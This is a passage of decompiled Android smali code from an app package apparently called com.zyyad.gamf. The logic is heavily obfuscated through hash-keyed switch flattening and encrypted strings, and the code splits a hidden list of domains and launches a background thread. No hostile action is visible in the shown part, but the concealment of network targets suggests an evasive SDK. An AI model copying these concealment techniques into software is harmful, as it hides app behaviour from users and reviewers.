    const-string v1, "\u06e4\u06df\u06db\u06da\u06eb\u06e7\u06eb\u06e2\u06e5\u06eb\u06da\u06db\u06e4\u06eb\u06d8\u06d8\u06db\u06e1\u06dc\u06e7\u06dc\u06e1\u06e7\u06eb\u06e7\u06e1\u06dc\u06d6\u06df\u06e2\u06dc\u06e1\u06dc\u06d6\u06e0\u06e1\u06ec\u06db\u06d6\u06d8\u06df\u06e4\u06db\u06e2\u06e5\u06e0\u06e0\u06d9\u06d8\u06d8\u06e2\u06e7\u06eb\u06e1\u06d9"

    :goto_7
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_7

    goto :goto_7

    :sswitch_20
    const v4, -0x36898121

    const-string v1, "\u06e6\u06db\u06e8\u06d8\u06dc\u06ec\u06e6\u06d8\u06e8\u06da\u06e7\u06e5\u06db\u06e8\u06d8\u06d7\u06e1\u06e4\u06ec\u06db\u06e1\u06da\u06db\u06e4\u06df\u06e1\u06e7\u06d8\u06ec\u06eb\u06e4\u06eb\u06e5\u06db\u06d8\u06d6\u06e2\u06d8\u06e5\u06e5\u06d8\u06df\u06e8\u06e8\u06da\u06e0\u06e1\u06d8\u06d9\u06e2\u06d7\u06da\u06eb\u06da"

    :goto_8
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_8

    goto :goto_8

    :sswitch_21
    const-string v1, "\u06db\u06da\u06db\u06da\u06e4\u06e2\u06e6\u06df\u06ec\u06df\u06dc\u06e4\u06e8\u06e8\u06e8\u06d8\u06e0\u06e8\u06e2\u06eb\u06e5\u06dc\u06e1\u06dc\u06e8\u06d8\u06e7\u06eb\u06da\u06e8\u06e1\u06e5"

    goto :goto_7

    :cond_3
    const-string v1, "\u06da\u06e2\u06db\u06eb\u06e7\u06dc\u06d6\u06dc\u06d9\u06ec\u06e5\u06d8\u06e1\u06e8\u06d6\u06eb\u06d9\u06e1\u06d8\u06d8\u06ec\u06e5\u06e1\u06e7\u06df\u06e7\u06da\u06d7\u06e2\u06e4\u06e1\u06e6\u06d8\u06e6\u06e5\u06e8\u06e7\u06d8\u06e5\u06da\u06e4\u06e4\u06e5\u06d7"

    goto :goto_8

    :sswitch_22
    if-nez v23, :cond_3

    const-string v1, "\u06dc\u06e6\u06e5\u06e4\u06e4\u06d8\u06e5\u06da\u06e6\u06d8\u06df\u06d9\u06e8\u06d8\u06dc\u06e8\u06ec\u06e6\u06df\u06e2\u06da\u06dc\u06da\u06da\u06e8\u06da\u06df\u06e8\u06e8\u06d8\u06dc\u06db\u06d7\u06e8\u06da\u06e6\u06eb\u06db\u06ec\u06ec\u06ec\u06db\u06d9\u06d6"

    goto :goto_8

    :sswitch_23
    const-string v1, "\u06d8\u06ec\u06d6\u06d8\u06eb\u06e7\u06da\u06d9\u06e5\u06e5\u06d8\u06db\u06dc\u06d9\u06e6\u06e7\u06dc\u06ec\u06d6\u06d8\u06da\u06e4\u06e5\u06e6\u06da\u06da\u06e8\u06d8\u06d9\u06eb\u06e6\u06d8"

    goto :goto_8

    :sswitch_24
    const-string v1, "\u06d6\u06ec\u06e8\u06d7\u06df\u06d8\u06db\u06e1\u06e6\u06da\u06e1\u06da\u06ec\u06d9\u06da\u06da\u06db\u06e0\u06e5\u06e7\u06db\u06e6\u06e8\u06d8\u06e5\u06df\u06eb\u06d8\u06db\u06e4"

    goto :goto_7

    :sswitch_25
    const-string v1, "\u06e7\u06d9\u06d8\u06eb\u06db\u06df\u06e0\u06ec\u06e6\u06e5\u06da\u06dc\u06e1\u06e0\u06e7\u06e2\u06e1\u06e1\u06d8\u06d7\u06e2\u06e2\u06e7\u06e7\u06db\u06e5\u06e1\u06e8\u06d7\u06da\u06e5\u06da\u06e0\u06e5\u06d8\u06d9\u06e4"

    goto :goto_7

    :sswitch_26
    const-string v1, "\u06e4\u06d7\u06d8\u06d8\u06d6\u06e6\u06e5\u06d8\u06eb\u06e2\u06d8\u06e2\u06e4\u06e5\u06e7\u06e8\u06db\u06db\u06e6\u06e4\u06d9\u06da\u06e1\u06d6\u06e2\u06e8\u06e2\u06d8\u06d8\u06ec\u06e2\u06e8\u06d8"

    goto/16 :goto_0

    :sswitch_27
    sget-object v1, Lcom/zyyad/gamf/kXEoVYTwnQIy;->DOMAINS:Ljava/lang/String;

    const-string v2, "2A==\n"

    const-string v4, "9MDf1QsDZOw=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v22

    const-string v1, "\u06db\u06dc\u06e1\u06d8\u06eb\u06d6\u06d6\u06df\u06d9\u06d8\u06d8\u06e8\u06e5\u06e5\u06d8\u06df\u06eb\u06dc\u06e8\u06e0\u06e0\u06df\u06e2\u06e6\u06d8\u06e5\u06da\u06dc\u06e6\u06e4\u06e1\u06e2\u06e7\u06d8\u06e8\u06e6\u06d6\u06da\u06e1\u06df"

    goto/16 :goto_0

    :sswitch_28
    const-string v1, "\u06e6\u06ec\u06d8\u06d8\u06d6\u06d8\u06d6\u06e2\u06ec\u06e5\u06d8\u06d6\u06e8\u06e7\u06d6\u06e7\u06e5\u06e7\u06eb\u06e8\u06d9\u06dc\u06e8\u06d8\u06db\u06d9\u06e4\u06e7\u06e8\u06e2\u06ec\u06e4\u06eb"

    move-object/from16 v3, v22

    goto/16 :goto_0

    :sswitch_29
    const/4 v1, 0x0

    new-array v2, v1, [Ljava/lang/String;

    const-string v1, "\u06e2\u06db\u06da\u06db\u06da\u06dc\u06d9\u06da\u06eb\u06e7\u06d8\u06e5\u06d8\u06d7\u06ec\u06e0\u06da\u06db\u06d7\u06e1\u06e2\u06e5\u06d8\u06ec\u06e5\u06df\u06e7\u06e5\u06dc\u06d8\u06e0\u06e1\u06e5\u06d8\u06e8\u06dc\u06d9\u06e5\u06e4\u06e2\u06d9\u06e7\u06d8\u06d8\u06ec\u06d7\u06d9"

    move-object/from16 v21, v2

    goto/16 :goto_0

    :sswitch_2a
    const-string v1, "\u06e5\u06e7\u06dc\u06d8\u06df\u06e8\u06d9\u06db\u06dc\u06e1\u06d8\u06eb\u06e7\u06e0\u06dc\u06e5\u06e7\u06e1\u06da\u06db\u06e5\u06e5\u06db\u06db\u06eb\u06e4\u06df\u06dc\u06da\u06ec\u06e6\u06d8"

    move-object/from16 v3, v21

    goto/16 :goto_0

    :sswitch_2b
    const-string v1, "STdhUaC3nQ==\n"

    const-string v2, "LVgMMMnZ7tU=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06ec\u06e2\u06dc\u06e1\u06ec\u06e5\u06e6\u06ec\u06e5\u06d8\u06df\u06d8\u06e4\u06db\u06e4\u06dc\u06e7\u06e5\u06da\u06d7\u06dc\u06e1\u06e8\u06e5\u06e0\u06e4\u06e8\u06d9\u06db\u06e2\u06e1\u06e6\u06dc\u06eb\u06d6\u06db\u06d8\u06e7\u06d8\u06eb\u06e4\u06e1\u06d8"

    move-object/from16 v20, v2

    goto/16 :goto_0

    :sswitch_2c
    const-string v1, "a5aZZg==\n"

    const-string v2, "G/nqElwmbJI=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06e0\u06e4\u06e1\u06ec\u06df\u06e5\u06d8\u06d7\u06eb\u06e5\u06d8\u06da\u06e0\u06df\u06ec\u06e0\u06e1\u06e0\u06dc\u06e8\u06e7\u06d6\u06d8\u06ec\u06e2\u06e5\u06ec\u06d6\u06ec\u06d9\u06da\u06d8\u06d8"

    move-object/from16 v19, v2

    goto/16 :goto_0

    :sswitch_2d
    const/4 v1, 0x2

    new-array v8, v1, [Ljava/lang/String;

    const-string v1, "\u06e5\u06e8\u06d6\u06d8\u06db\u06e8\u06db\u06e7\u06d7\u06d6\u06d8\u06e6\u06d7\u06e8\u06e7\u06d6\u06e1\u06d8\u06e2\u06e5\u06ec\u06e5\u06df\u06e7\u06dc\u06e0\u06dc\u06e2\u06db\u06dc\u06e7\u06e8\u06ec\u06e0\u06d6\u06e1\u06d7\u06dc\u06e8\u06e1\u06e7\u06e1\u06e1\u06e5\u06d9"

    goto/16 :goto_0

    :sswitch_2e
    const/4 v1, 0x0

    aput-object v20, v8, v1

    const-string v1, "\u06e8\u06e7\u06e5\u06d8\u06e4\u06df\u06d8\u06d6\u06eb\u06e0\u06e8\u06d8\u06da\u06d8\u06eb\u06d6\u06d8\u06eb\u06dc\u06d8\u06e7\u06e5\u06e5\u06d8\u06e5\u06e5\u06db\u06e2\u06dc\u06d8\u06e1\u06d7\u06d6\u06df\u06d6\u06d9\u06e7\u06e0\u06ec\u06e0\u06e2\u06d6\u06e4\u06d6\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_2f
    const/4 v1, 0x1

    aput-object v19, v8, v1

    const-string v1, "\u06d6\u06ec\u06d8\u06e2\u06da\u06e1\u06d8\u06e7\u06d7\u06e1\u06d8\u06d9\u06e0\u06e5\u06d8\u06e8\u06e0\u06dc\u06d8\u06db\u06db\u06e1\u06e7\u06df\u06e6\u06e7\u06d8\u06d8\u06df\u06df\u06e0\u06df\u06e7\u06e8"

    goto/16 :goto_0

    :sswitch_30
    const/4 v1, 0x0

    aget-object v2, v8, v1

    const-string v1, "\u06e7\u06d8\u06e6\u06d8\u06e5\u06e5\u06e1\u06dc\u06d9\u06dc\u06dc\u06df\u06eb\u06d6\u06e5\u06e0\u06d7\u06e5\u06eb\u06e4\u06e0\u06e8\u06d6\u06d9\u06dc\u06e7\u06e1\u06db\u06d6\u06e5\u06d8\u06d6\u06ec\u06df\u06e6\u06e8\u06dc\u06d8\u06ec\u06da\u06e5\u06e1\u06e0\u06d8\u06e5\u06e0\u06e1\u06df\u06e4\u06e1\u06d8"

    move-object/from16 v18, v2

    goto/16 :goto_0

    :sswitch_31
    const-string v1, "YsQ1x3U4jw==\n"

    const-string v2, "BqtYphxW/O4=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06d7\u06df\u06e7\u06ec\u06dc\u06e7\u06e4\u06dc\u06e7\u06e1\u06e8\u06d8\u06e2\u06eb\u06d7\u06d7\u06e7\u06e8\u06e0\u06d8\u06d8\u06e2\u06e2\u06dc\u06d6\u06e7\u06d6\u06eb\u06dc\u06e7\u06d8\u06eb\u06e5\u06e6\u06d8\u06e6\u06e2\u06d9"

    move-object/from16 v17, v2

    goto/16 :goto_0

    :sswitch_32
    const-string v1, "\u06e0\u06ec\u06db\u06eb\u06e2\u06e5\u06d8\u06ec\u06dc\u06d6\u06d8\u06df\u06db\u06e6\u06d8\u06d8\u06eb\u06df\u06e2\u06e7\u06d6\u06d8\u06d9\u06d7\u06e4\u06e8\u06ec\u06e2\u06da\u06e6\u06ec\u06d6\u06d9\u06e5\u06e4\u06e1\u06eb\u06e2\u06e2\u06d6\u06d8\u06ec\u06e7\u06ec\u06e4\u06d9\u06da\u06dc\u06dc\u06e8\u06df\u06dc\u06e0\u06eb\u06ec\u06e6\u06d8\u06e7\u06db\u06d8\u06d8"

    move/from16 v15, v16

    goto/16 :goto_0

    :sswitch_33
    const v2, 0x7ba009ab

    const-string v1, "\u06df\u06e7\u06e2\u06e5\u06e0\u06e7\u06d8\u06d8\u06d9\u06e0\u06e4\u06e5\u06d8\u06e6\u06ec\u06e1\u06eb\u06e0\u06e0\u06e2\u06d7\u06dc\u06db\u06e4\u06d6\u06e4\u06e0\u06e6\u06da\u06e6\u06e2\u06eb\u06eb\u06ec\u06ec\u06e6\u06d7\u06ec\u06dc\u06e2\u06e7\u06dc\u06e0\u06e1\u06dc\u06da\u06d7\u06e8\u06e1\u06db\u06d6\u06d8\u06e5\u06e2\u06e7"

    :goto_9
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_9

    goto :goto_9

    :sswitch_34
    const-string v1, "\u06e2\u06e0\u06dc\u06e4\u06d7\u06e6\u06da\u06e1\u06e0\u06df\u06d9\u06ec\u06e7\u06eb\u06e7\u06eb\u06ec\u06db\u06e2\u06d7\u06df\u06d7\u06d7\u06d6\u06dc\u06e6\u06e4\u06eb\u06df\u06e6\u06d9\u06d6\u06e5\u06d8\u06db\u06d6\u06e2\u06dc\u06df\u06d8\u06d7\u06d9\u06df"

    goto/16 :goto_0

    :sswitch_35
    const-string v1, "\u06e1\u06e5\u06e0\u06e0\u06e4\u06e8\u06d8\u06dc\u06df\u06e6\u06d8\u06df\u06da\u06e6\u06db\u06eb\u06db\u06e4\u06df\u06ec\u06e1\u06d8\u06d8\u06e6\u06df\u06e6\u06d8\u06e7\u06da\u06d8\u06d8\u06e8\u06e1\u06e6\u06e8\u06dc\u06dc\u06da\u06da\u06e2\u06e5\u06e2\u06dc\u06d8\u06d9\u06df\u06d9\u06e1\u06d9\u06e6\u06d8\u06e7\u06e7\u06e7\u06db\u06db\u06e5\u06eb\u06df\u06e6\u06d8"

    goto :goto_9

    :sswitch_36
    const v4, 0x3b0b5317

    const-string v1, "\u06db\u06eb\u06d8\u06e7\u06e0\u06e8\u06d8\u06da\u06e8\u06dc\u06d8\u06df\u06d6\u06da\u06e7\u06e8\u06dc\u06ec\u06da\u06e5\u06d8\u06e5\u06da\u06e1\u06d8\u06e5\u06e4\u06e5\u06d8\u06df\u06e8\u06df\u06e0\u06d8\u06dc"

    :goto_a
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_a

    goto :goto_a

    :sswitch_37
    const-string v1, "\u06d7\u06df\u06dc\u06d8\u06e5\u06d6\u06e6\u06e7\u06e1\u06d8\u06d8\u06e8\u06e8\u06d8\u06e2\u06e0\u06df\u06d7\u06da\u06e7\u06d7\u06d7\u06d6\u06d6\u06e6\u06da\u06da\u06d6\u06d8\u06df\u06e7\u06e8\u06e5\u06e5\u06df\u06eb\u06d7\u06da\u06da\u06d9\u06e6\u06d8\u06e0\u06da\u06db\u06e1\u06e7\u06d8\u06e1\u06e6\u06e6\u06db\u06d7\u06e2\u06d7\u06e2"

    goto :goto_a

    :cond_4
    const-string v1, "\u06e4\u06e6\u06d6\u06da\u06e0\u06e5\u06d8\u06e6\u06da\u06e6\u06e5\u06dc\u06e8\u06e0\u06e0\u06e8\u06d8\u06e4\u06e2\u06e8\u06db\u06db\u06e4\u06e2\u06e2\u06e6\u06e1\u06d8\u06e7\u06e1\u06e2\u06df\u06d9\u06d8\u06e7\u06e6\u06d8\u06e7\u06dc\u06e7\u06e8\u06d6\u06dc\u06d8\u06e8\u06e6\u06e5\u06e2\u06e5\u06ec"

    goto :goto_a

    :sswitch_38
    sget-object v1, LCu7y/sdk/e5;->e:Ljava/lang/String;

    move-object/from16 v0, v17

    invoke-interface {v7, v1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    move-object/from16 v0, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v1, "\u06df\u06d9\u06df\u06da\u06e1\u06db\u06ec\u06dc\u06dc\u06d8\u06d9\u06d6\u06ec\u06db\u06da\u06e7\u06d9\u06e4\u06dc\u06e7\u06e2\u06e8\u06e1\u06db\u06e8\u06d8\u06d6\u06dc\u06e5\u06d8\u06db\u06e5\u06d8\u06dc\u06ec\u06e4\u06db\u06d9\u06e8\u06d8"

    goto :goto_a

    :sswitch_39
    const-string v1, "\u06d6\u06eb\u06ec\u06dc\u06e4\u06e6\u06e7\u06e2\u06e6\u06d8\u06da\u06db\u06e1\u06d8\u06df\u06e7\u06e1\u06e2\u06e4\u06e8\u06d8\u06d6\u06e2\u06e4\u06e8\u06e5\u06d8\u06e0\u06ec\u06d6\u06d8\u06d6\u06ec\u06d8"

    goto :goto_9

    :sswitch_3a
    const-string v1, "\u06dc\u06db\u06e6\u06d9\u06d8\u06dc\u06db\u06e5\u06da\u06e0\u06e5\u06e5\u06e8\u06db\u06e0\u06d7\u06d9\u06e2\u06db\u06d8\u06d8\u06e5\u06da\u06e6\u06e7\u06e7\u06d8\u06d9\u06d6\u06dc\u06d8\u06eb\u06df\u06ec\u06d8\u06d8\u06e6\u06d8\u06d8\u06e8\u06df\u06e1\u06e4\u06e0"

    goto :goto_9

    :sswitch_3b
    const-string v1, "\u06eb\u06e2\u06ec\u06e2\u06d8\u06dc\u06d8\u06d7\u06e4\u06df\u06e0\u06db\u06dc\u06d8\u06e6\u06ec\u06ec\u06da\u06da\u06da\u06ec\u06e1\u06d7\u06e6\u06e5\u06d6\u06d7\u06dc\u06e8\u06d8\u06d6\u06df\u06d9\u06d6\u06da\u06d6\u06d8\u06e4\u06e1\u06e7\u06d7\u06d8\u06e6\u06d8\u06e0"

    move/from16 v15, v16

    goto/16 :goto_0

    :sswitch_3c
    const v2, -0x16275363

    const-string v1, "\u06e0\u06dc\u06e8\u06d8\u06e7\u06e2\u06d6\u06e4\u06db\u06d9\u06d8\u06e2\u06d6\u06e4\u06e0\u06e6\u06d8\u06e6\u06e7\u06dc\u06d9\u06e5\u06dc\u06da\u06eb\u06e6\u06d8\u06d6\u06e4\u06db\u06d9\u06eb\u06dc\u06d9\u06dc\u06e5\u06d8\u06e5\u06e6\u06d8\u06eb\u06eb\u06d9\u06e6\u06da\u06d8\u06d8"

    :goto_b
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_b

    goto :goto_b

    :sswitch_3d
    const v4, -0x72ebc064

    const-string v1, "\u06dc\u06e6\u06ec\u06d8\u06d9\u06e6\u06d8\u06ec\u06dc\u06e4\u06df\u06d8\u06e6\u06ec\u06ec\u06e5\u06e0\u06d6\u06e4\u06e8\u06db\u06e4\u06e4\u06e7\u06e5\u06e6\u06e7\u06d9\u06e8\u06e7\u06e4\u06e8\u06e5\u06ec\u06e4\u06d9\u06d9\u06e5\u06d8\u06e1\u06e1\u06e8\u06e7\u06d8\u06ec\u06e6\u06da\u06db\u06e6\u06d8"

    :goto_c
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_c

    goto :goto_c

    :sswitch_3e
    const-string v1, "\u06e4\u06d7\u06db\u06d7\u06e0\u06d8\u06d8\u06eb\u06e8\u06eb\u06d7\u06ec\u06ec\u06da\u06e5\u06d6\u06d9\u06e7\u06e4\u06e7\u06db\u06da\u06e7\u06e7\u06e4\u06d9\u06e4\u06da\u06e7\u06d6\u06d8\u06e0\u06ec\u06e7\u06e8\u06e2\u06d8\u06e2\u06e0\u06e6\u06d8\u06e1\u06ec\u06dc\u06d8\u06d8\u06e7\u06db\u06e7\u06e0"

    goto :goto_c

    :sswitch_3f
    const-string v1, "\u06ec\u06e0\u06e7\u06d8\u06ec\u06e0\u06e0\u06e4\u06d7\u06e8\u06df\u06df\u06d9\u06e4\u06e1\u06d8\u06d8\u06da\u06df\u06e8\u06dc\u06e8\u06d8\u06e8\u06da\u06d8\u06d8\u06e2\u06db\u06d8\u06d8\u06e2\u06e6\u06e0\u06e5\u06e7\u06e1\u06e8\u06e6\u06e1\u06db\u06d9\u06db\u06e4"

    goto :goto_b

    :cond_5
    const-string v1, "\u06e4\u06d8\u06e1\u06d8\u06e0\u06d6\u06e6\u06d8\u06d8\u06d8\u06e5\u06df\u06e4\u06e1\u06eb\u06e0\u06d6\u06d8\u06d6\u06e5\u06eb\u06e6\u06d9\u06e5\u06e5\u06db\u06ec\u06d6\u06e1\u06d8\u06dc\u06db\u06e2\u06ec\u06d6\u06df\u06d7\u06e0\u06e6\u06e0\u06da\u06e8\u06e5\u06e2\u06da\u06e7\u06df\u06e2\u06e8\u06da\u06d7\u06e1\u06eb\u06da\u06e6\u06d9\u06d6"

    goto :goto_c

    :sswitch_40
    if-nez v23, :cond_5

    const-string v1, "\u06ec\u06dc\u06e4\u06e8\u06db\u06e8\u06d8\u06e2\u06e5\u06e2\u06d6\u06e1\u06d9\u06e4\u06dc\u06d8\u06d9\u06e4\u06d6\u06e1\u06e8\u06ec\u06ec\u06e5\u06e5\u06d8\u06df\u06e5\u06e1\u06d7\u06db\u06e8\u06d8\u06dc\u06d6\u06e5\u06d8\u06e4\u06dc\u06d6\u06d8\u06e8\u06e1\u06da\u06df\u06d6\u06d8\u06d8\u06ec\u06e6\u06e1\u06da\u06d9\u06d8\u06d8\u06d6\u06db\u06d6\u06d8\u06da\u06e8\u06e1"

    goto :goto_c

    :sswitch_41
    const-string v1, "\u06e6\u06e5\u06e7\u06d8\u06d6\u06df\u06e2\u06ec\u06d6\u06eb\u06e0\u06db\u06e0\u06e2\u06e2\u06e5\u06e1\u06eb\u06df\u06dc\u06dc\u06d8\u06e0\u06e2\u06e2\u06dc\u06d7\u06e2\u06da\u06d9\u06dc\u06d8\u06e7\u06e4\u06e4\u06e1\u06e8\u06dc\u06eb\u06e8\u06da\u06e5\u06db\u06db\u06df\u06d9\u06e5\u06e5\u06e5\u06dc\u06d8"

    goto :goto_b

    :sswitch_42
    const-string v1, "\u06e4\u06e2\u06d6\u06d8\u06e0\u06e2\u06e1\u06d8\u06e5\u06e7\u06d8\u06d8\u06e5\u06d7\u06e0\u06e1\u06e2\u06eb\u06e4\u06e0\u06d8\u06d8\u06dc\u06e7\u06e7\u06e0\u06e0\u06e6\u06d8\u06e8\u06e5\u06e0\u06db\u06df\u06d8\u06d9\u06e7\u06eb\u06e5\u06e7\u06e6\u06d8\u06da\u06e6\u06e2\u06e1\u06e0\u06d6\u06d8"

    goto :goto_b

    :sswitch_43
    const-string v1, "\u06e8\u06ec\u06e5\u06d8\u06e1\u06da\u06eb\u06ec\u06e8\u06e4\u06e7\u06df\u06e1\u06d8\u06e6\u06d6\u06dc\u06d8\u06d7\u06da\u06e6\u06e0\u06e2\u06e8\u06dc\u06e1\u06e7\u06d8\u06db\u06d7\u06e1\u06d8\u06df\u06e8\u06d8"

    goto/16 :goto_0

    :sswitch_44
    const/4 v2, 0x0

    const-string v1, "\u06d6\u06db\u06e8\u06d9\u06eb\u06e8\u06e1\u06dc\u06e8\u06d8\u06d7\u06dc\u06e1\u06da\u06e5\u06d6\u06e5\u06e6\u06eb\u06e8\u06d6\u06e1\u06da\u06ec\u06e1\u06d8\u06e1\u06dc\u06e7\u06d7\u06e7\u06da"

    move v14, v2

    goto/16 :goto_0

    :sswitch_45
    const-string v1, "\u06d7\u06e7\u06e5\u06ec\u06d6\u06d8\u06dc\u06da\u06db\u06e6\u06d9\u06e2\u06ec\u06e0\u06dc\u06ec\u06e5\u06da\u06e4\u06e6\u06d7\u06e8\u06df\u06da\u06ec\u06e6\u06dc\u06ec\u06d6\u06e6\u06d8\u06e4\u06eb\u06d8\u06df\u06e5\u06d6\u06d8\u06eb\u06db\u06e4\u06d7\u06e1\u06e5\u06d8\u06e4\u06d9\u06e6\u06e1\u06e2\u06ec"

    move v15, v14

    goto/16 :goto_0

    :sswitch_46
    sget-object v1, LCu7y/sdk/e5;->f:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-interface {v7, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    const-string v1, "\u06e7\u06ec\u06db\u06e7\u06d8\u06e6\u06db\u06e2\u06e6\u06d8\u06e6\u06e2\u06eb\u06db\u06e4\u06e6\u06db\u06db\u06e5\u06d8\u06dc\u06df\u06e5\u06d8\u06eb\u06e0\u06e4\u06ec\u06eb\u06e8\u06d8\u06e0\u06e8\u06e8\u06d8\u06e4\u06e5\u06e7\u06df\u06ec\u06e6\u06d8\u06d9\u06d7\u06e5\u06e0\u06e1\u06e0"

    move v13, v2

    goto/16 :goto_0

    :sswitch_47
    new-instance v24, Ljava/lang/Thread;

    new-instance v1, LCu7y/sdk/z4;

    const/4 v2, 0x1

    new-array v2, v2, [I

    const/4 v4, 0x0

    aput v15, v2, v4

    const/4 v4, 0x1

    new-array v4, v4, [I

    const/4 v5, 0x0

    aput v13, v4, v5

    const/4 v5, 0x1

    new-array v6, v5, [I

    const/4 v5, 0x0

    const/4 v9, 0x0

    aput v9, v6, v5

    const/4 v5, 0x1

    new-array v9, v5, [Z

    const/4 v5, 0x0

    const/4 v10, 0x0

    aput-boolean v10, v9, v5

    const/4 v5, 0x1

    new-array v10, v5, [Z

    const/4 v5, 0x0

    const/4 v11, 0x0

    aput-boolean v11, v10, v5

    xor-int/lit8 v11, v23, 0x1

    const/4 v5, 0x1

    new-array v12, v5, [I

    const/4 v5, 0x0

    const/16 v25, 0x0

    aput v25, v12, v5

    move-object/from16 v5, p0

    invoke-direct/range {v1 .. v12}, LCu7y/sdk/z4;-><init>([I[Ljava/lang/String;[ILandroid/content/Context;[ILandroid/content/SharedPreferences;[Ljava/lang/String;[Z[ZZ[I)V

    move-object/from16 v0, v24

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual/range {v24 .. v24}, Ljava/lang/Thread;->start()V

    const-string v1, "\u06e1\u06e5\u06e5\u06d6\u06e0\u06da\u06d8\u06db\u06eb\u06e2\u06e7\u06e7\u06e8\u06d7\u06d6\u06e8\u06e1\u06e2\u06e8\u06e1\u06db\u06db\u06db\u06e5\u06d8\u06e6\u06e4\u06e8\u06d8\u06e1\u06e7\u06e4\u06e1\u06e1\u06e4\u06e0\u06d6\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_48
    const-string v1, "\u06e7\u06d9\u06e5\u06d8\u06d7\u06e0\u06e8\u06dc\u06eb\u06d8\u06d8\u06e4\u06e6\u06d6\u06d6\u06eb\u06e1\u06d8\u06e1\u06e7\u06e0\u06e0\u06ec\u06e8\u06d8\u06da\u06eb\u06e0\u06e1\u06e5\u06e1\u06d8\u06ec\u06d8\u06e5\u06ec\u06ec\u06e2\u06e0\u06eb"

    goto/16 :goto_0

    :sswitch_49
    const-string v1, "\u06e6\u06ec\u06d8\u06d8\u06d6\u06d8\u06d6\u06e2\u06ec\u06e5\u06d8\u06d6\u06e8\u06e7\u06d6\u06e7\u06e5\u06e7\u06eb\u06e8\u06d9\u06dc\u06e8\u06d8\u06db\u06d9\u06e4\u06e7\u06e8\u06e2\u06ec\u06e4\u06eb"

    goto/16 :goto_0

    :sswitch_4a
    const-string v1, "\u06e1\u06da\u06df\u06d9\u06ec\u06e8\u06d8\u06d7\u06e7\u06e6\u06d8\u06d6\u06e5\u06d9\u06e1\u06d8\u06e6\u06d8\u06da\u06df\u06e8\u06d8\u06df\u06e8\u06dc\u06df\u06d8\u06d7\u06d6\u06e5\u06e6\u06eb\u06d7\u06df"

    goto/16 :goto_0

    :sswitch_4b
    const-string v1, "\u06e4\u06d7\u06e6\u06d8\u06eb\u06d7\u06da\u06eb\u06d9\u06e8\u06d8\u06e5\u06d8\u06d8\u06d7\u06eb\u06e5\u06e0\u06da\u06e6\u06e7\u06d8\u06e7\u06d8\u06db\u06e0\u06e0\u06e4\u06e7\u06e1\u06d8\u06e5\u06e8\u06d6\u06d8\u06d7\u06eb\u06e1\u06d9\u06d8"

    goto/16 :goto_0

    :sswitch_4c
    const-string v1, "\u06d7\u06e7\u06e5\u06ec\u06d6\u06d8\u06dc\u06da\u06db\u06e6\u06d9\u06e2\u06ec\u06e0\u06dc\u06ec\u06e5\u06da\u06e4\u06e6\u06d7\u06e8\u06df\u06da\u06ec\u06e6\u06dc\u06ec\u06d6\u06e6\u06d8\u06e4\u06eb\u06d8\u06df\u06e5\u06d6\u06d8\u06eb\u06db\u06e4\u06d7\u06e1\u06e5\u06d8\u06e4\u06d9\u06e6\u06e1\u06e2\u06ec"

    goto/16 :goto_0

    :sswitch_4d
    const-string v1, "\u06e1\u06e5\u06e5\u06d6\u06e0\u06da\u06d8\u06db\u06eb\u06e2\u06e7\u06e7\u06e8\u06d7\u06d6\u06e8\u06e1\u06e2\u06e8\u06e1\u06db\u06db\u06db\u06e5\u06d8\u06e6\u06e4\u06e8\u06d8\u06e1\u06e7\u06e4\u06e1\u06e1\u06e4\u06e0\u06d6\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_4e
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x7636b9e0 -> :sswitch_1c
        -0x7590c18f -> :sswitch_44
        -0x693c67b1 -> :sswitch_1
        -0x440faedc -> :sswitch_3
        -0x37141e9a -> :sswitch_2e
        -0x2f64be02 -> :sswitch_30
        -0x297790b9 -> :sswitch_1f
        -0x2695954b -> :sswitch_1b
        -0x262ca78e -> :sswitch_49
        -0x23b1fdc4 -> :sswitch_3b
        -0x23638ff9 -> :sswitch_28
        -0x10f5c82d -> :sswitch_3c
        0xa884a1 -> :sswitch_4b
        0x5fd16f0 -> :sswitch_2
        0xc2814cf -> :sswitch_1d
        0x1128f534 -> :sswitch_46
        0x216261ff -> :sswitch_27
        0x22b5d2f8 -> :sswitch_33
        0x261786c0 -> :sswitch_32
        0x2a5eb169 -> :sswitch_0
        0x2e4164e7 -> :sswitch_2b
        0x376fef15 -> :sswitch_4d
        0x3d266115 -> :sswitch_2a
